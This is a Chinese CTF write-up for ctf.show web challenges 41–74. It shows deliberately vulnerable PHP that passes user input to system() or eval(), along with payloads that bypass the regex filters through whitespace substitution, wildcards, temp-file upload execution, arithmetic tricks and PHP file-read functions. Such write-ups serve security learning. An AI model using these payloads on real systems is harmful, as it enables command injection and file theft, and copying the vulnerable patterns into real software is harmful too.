<h3 id="web41"><a href="#web41" class="headerlink" title="web41"></a>web41</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;echo(<span class="subst">$c</span>);&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>过滤了</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">0-9 a-z ^ + ~ $ [ ] &#123; &#125; &amp; - </span><br></pre></td></tr></table></figure>









<h3 id="web42"><a href="#web42" class="headerlink" title="web42"></a>web42</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>直接运行就行，用分号隔断</p>
<p>payload：<code>?c=cat flag.php;</code></p>
<h3 id="web-43"><a href="#web-43" class="headerlink" title="web 43"></a>web 43</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>屏蔽了分号隔断</p>
<p>可以使用||这个符号的作用就是左边执行的话右边不执行</p>
<h3 id="web-44"><a href="#web-44" class="headerlink" title="web 44"></a>web 44</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/;|cat|flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>多过滤了flag还有cat</p>
<p>用sort fla*</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">文件读取的方式：</span><br><span class="line">cat--由第一行开始显示内容，并将所有内容输出</span><br><span class="line">tac--从最后一行倒序显示内容，并将所有内容输出</span><br><span class="line">more-- 根据窗口大小，一页一页的现实文件内容</span><br><span class="line">less 和more类似，但其优点可以往前翻页，而且进行可以搜索字符</span><br><span class="line">head-- 只显示头几行</span><br><span class="line">tail --只显示最后几行</span><br><span class="line">nl --类似于cat -n，显示时输出行号</span><br><span class="line">tailf-- 类似于tail -f</span><br><span class="line">vim --使用vim工具打开文本</span><br><span class="line">vi --使用vi打开文本cat 由第一行开始显示内容，并将所有内容输出</span><br></pre></td></tr></table></figure>





<h3 id="web-45"><a href="#web-45" class="headerlink" title="web 45"></a>web 45</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| /i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>多过滤了空格</p>
<p>空格用%09代替即可绕过</p>
<h3 id="web-46"><a href="#web-46" class="headerlink" title="web 46"></a>web 46</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>多过滤了$符号以及*还有数字</p>
<p>%09会进行二次编码所以不用担心数字过滤</p>
<p>还有别的绕过方法如${IFS}但是这里过滤了$符号</p>
<p><code>&lt;&gt;,&lt;,$IF$9</code>但在这里好像都不行</p>
<h3 id="web-47"><a href="#web-47" class="headerlink" title="web 47"></a>web 47</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>多过滤了<code>more less head sort tail</code></p>
<p>可以用tac，具体其他命令44写了</p>
<h3 id="web-48"><a href="#web-48" class="headerlink" title="web 48"></a>web 48</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>多过滤了<code>sed cut awk strings od curl</code></p>
<p>无影响</p>
<h3 id="web-49"><a href="#web-49" class="headerlink" title="web 49"></a>web 49</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>多过滤了%用&lt;绕过</p>
<p><code>?c=tac&lt;fla&quot;&quot;g.php||</code></p>
<h3 id="web-50"><a href="#web-50" class="headerlink" title="web 50"></a>web 50</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>过滤了tab还有&amp;</p>
<p>一样绕</p>
<h3 id="web-51"><a href="#web-51" class="headerlink" title="web 51"></a>web 51</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>tac也过滤了但是nl没有过滤</p>
<p>替换成nl，vi都行</p>
<h3 id="web-52"><a href="#web-52" class="headerlink" title="web 52"></a>web 52</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>现在<code>&lt;&gt;</code>也被过滤了但是$符号又放出来了</p>
<p>不过这题的flag在根目录下</p>
<h3 id="web-53"><a href="#web-53" class="headerlink" title="web 53"></a>web 53</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$d</span> = system(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="variable">$d</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;no&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>多过滤了wget</p>
<p>直接执行系统命令</p>
<p>payload</p>
<p><code>c=nl$&#123;IFS&#125;fla&quot;&quot;g.php</code></p>
<h3 id="web-54"><a href="#web-54" class="headerlink" title="web 54"></a>web 54</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>;|cat|flag| |[0-9]|\ |more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|nl|scp|rm</code></p>
<p>被过滤的参数</p>
<p>不能出现相连字母，所以flag.php可以用？代替f???????</p>
<p>最后vi输出或者是/bin/后面接过滤参数bin是命令目录</p>
<h3 id="web-55"><a href="#web-55" class="headerlink" title="web 55"></a>web 55</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>过滤了所有小写字母</p>
<p>这里需要构造上传，更改一下上传脚本，并且构造poc执行命令</p>
<p><code>?c=.+/???/????????[@-[]</code></p>
<p>[@-[]是linux下面的通配符，匹配的是大写字母</p>
<p>然后在上传文件里面更改添加sh命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">！/bin/sh</span></span><br><span class="line">ls</span><br></pre></td></tr></table></figure>

<p>就可以直接执行命令。</p>
<p>附构造上传脚本：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>POST数据包POC<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://46230c96-8291-44b8-a58c-c133ec248231.chall.ctf.show/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--链接是当前打开的题目链接--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>文件名：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="web-56"><a href="#web-56" class="headerlink" title="web 56"></a>web 56</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|[a-z]|[0-9]|\\$|\(|\&#123;|\&#x27;|\&quot;|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>额外过滤了数字</p>
<p>也可以用上面的方法</p>
<h3 id="web-57"><a href="#web-57" class="headerlink" title="web 57"></a>web 57</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    flag在<span class="number">36</span>.php中</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|[a-z]|[0-9]|\`|\|\#|\&#x27;|\&quot;|\`|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="string">&quot;cat &quot;</span>.<span class="variable">$c</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>额外过滤了上面的方法</p>
<p>涉及到了linux的命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">&#123;_&#125; =<span class="string">&quot;&quot;</span> //返回上一次命令</span></span><br><span class="line"><span class="meta">$</span><span class="bash">((<span class="variable">$&#123;_&#125;</span>))=0</span></span><br><span class="line"><span class="meta">$</span><span class="bash">((~$((<span class="variable">$&#123;_&#125;</span>))))=-1</span></span><br><span class="line">payload：</span><br><span class="line"><span class="meta">$</span><span class="bash">((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~</span></span><br><span class="line"><span class="meta">$</span><span class="bash">(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~</span></span><br><span class="line"><span class="meta">$</span><span class="bash">(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~</span></span><br><span class="line"><span class="meta">$</span><span class="bash">(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~</span></span><br><span class="line"><span class="meta">$</span><span class="bash">(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~</span></span><br><span class="line"><span class="meta">$</span><span class="bash">(())))$((~$(())))$((~$(())))))))</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>构成-36取反就好了</p>
<h3 id="web-58"><a href="#web-58" class="headerlink" title="web 58"></a>web 58</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">突破禁用命令的方法：</span><br><span class="line">1、通过复制，重命名读取php文件内容		函数：copy、rename</span><br><span class="line">2、单一函数读文件内容：			  函数：file_get_contents()[搭配echo]		readfile()  	file()[搭配peint_r]</span><br><span class="line">3、通过fopen读文件内容：				</span><br><span class="line">函数：</span><br><span class="line">fread()		用法：$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);echo fread($a,&quot;1000&quot;);          </span><br><span class="line">fgets()			 $a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line = fgets($a);echo $line;&#125;</span><br><span class="line">fgetc()			 $a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line = fgetc($a);echo $line;&#125;</span><br><span class="line">fgetss()		 $a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line = fgetss($a);echo $line;&#125;//php7.3后无法使用</span><br><span class="line">fgetcsv()		 $a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line = fgetcsv($a);print_r($line);&#125;</span><br><span class="line">gpassthru()		 $a=fopen(&quot;flag.php&quot;,&quot;r&quot;);echo fpassthru($a); </span><br><span class="line">4、高亮：		函数：	show_source()	highlight_file()</span><br><span class="line">5、flag不在flag.php中，遍历目录：		函数：		scandir() 	opendir()</span><br><span class="line">6、flag是txt直接包含：		函数： 	include()		require()</span><br><span class="line">7、绕过之前的正则：在后面接exit();</span><br><span class="line">8、绕过open_basedir：   函数：</span><br></pre></td></tr></table></figure>



<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是禁用了system好像，可以用highlight_file()绕过</p>
<p>也可以用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo file_get_contents(&quot;flag.php&quot;);</span><br><span class="line">readfile(&quot;flag.php&quot;);        </span><br></pre></td></tr></table></figure>



<h3 id="web-59"><a href="#web-59" class="headerlink" title="web 59"></a>web 59</h3><p>同样的数据</p>
<p>也没有过滤highlight_file()</p>
<p>也可以：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">print_r(file(&quot;flag.php&quot;)); </span><br></pre></td></tr></table></figure>

<h3 id="web-60"><a href="#web-60" class="headerlink" title="web 60"></a>web 60</h3><p>见web58</p>
<p>也可以<code>（rename）copy(&quot;flag.php&quot;,&quot;flag.txt&quot;)</code>访问</p>
<h3 id="web-61-65"><a href="#web-61-65" class="headerlink" title="web 61-65"></a>web 61-65</h3><p>高亮</p>
<h3 id="web66"><a href="#web66" class="headerlink" title="web66"></a>web66</h3><p>使用高亮发现flag不在这里，使用目录遍历</p>
<p><code>print_r(scandir(&#39;.&#39;));</code></p>
<p>发现flag在根目录下的flag.txt中</p>
<p>然后用高亮显示</p>
<p><code>c=highlight_file(&#39;/flag.txt&#39;);</code></p>
<h3 id="web-67"><a href="#web-67" class="headerlink" title="web 67"></a>web 67</h3><p><code>print_r</code>被禁，用var_dump代替</p>
<h3 id="web-68"><a href="#web-68" class="headerlink" title="web 68"></a>web 68</h3><p>发现高亮被过滤，但是可以继续遍历目录</p>
<p>flag还是在根目录下</p>
<p>因为他是txt文件，直接include这个文件他就会直接在网页中显示</p>
<h3 id="web-69-70"><a href="#web-69-70" class="headerlink" title="web 69-70"></a>web 69-70</h3><p> <code>var_dump</code>被禁用,可以用<code>var_export</code>替代</p>
<h3 id="web-71"><a href="#web-71" class="headerlink" title="web 71"></a>web 71</h3><p>使用上面方法的时候发现，全是问号</p>
<p>但是遍历根目录的时候可以发现????.???猜测是flag.txt</p>
<p>读取这个方法也全是问号，想到用utf-8编码看一下是不是编码问题</p>
<p>查看源代码发现下面有一层过滤</p>
<p>可以用exit();跳过这层过滤</p>
<h3 id="web-72"><a href="#web-72" class="headerlink" title="web 72"></a>web 72</h3><h3 id="web-73"><a href="#web-73" class="headerlink" title="web 73"></a>web 73</h3><p>先用var_export遍历一下目录发现根目录下面的flagc.txt文件</p>
<p>然后include包含这个文件就可以</p>
<h3 id="web-74"><a href="#web-74" class="headerlink" title="web 74"></a>web 74</h3><p>这里过滤掉了dir相关的函数</p>
<p>用glob函数过</p>
<p>使用方法：``</p>
<p>glob(‘./*’)遍历当前目录下的文件</p>
